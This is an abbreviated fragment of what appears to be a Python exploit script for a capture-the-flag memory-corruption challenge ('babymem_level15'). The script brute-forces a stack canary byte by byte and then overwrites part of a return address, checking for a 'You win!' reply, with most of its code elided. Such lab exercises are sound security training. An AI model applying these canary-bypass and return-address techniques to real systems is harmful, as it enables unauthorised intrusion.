...
FILENAME='/babymem_level15_testing1'
...
while len(stack_canary) < 8:
    ...
    # Send input
    p.sendline(bytes(str(40 + len(stack_canary) + 1), 'utf-8'))
...
while len(return_address) < 2:
    ...
    # Send input
    p.sendline(bytes(str(56 + len(return_address) + 1), 'utf-8'))
    ...
    if server.recvline_startswith(b'You win!', timeout=1):
        ...
        byte_val = 0x9 if byte_val > 255 else byte_val + 16
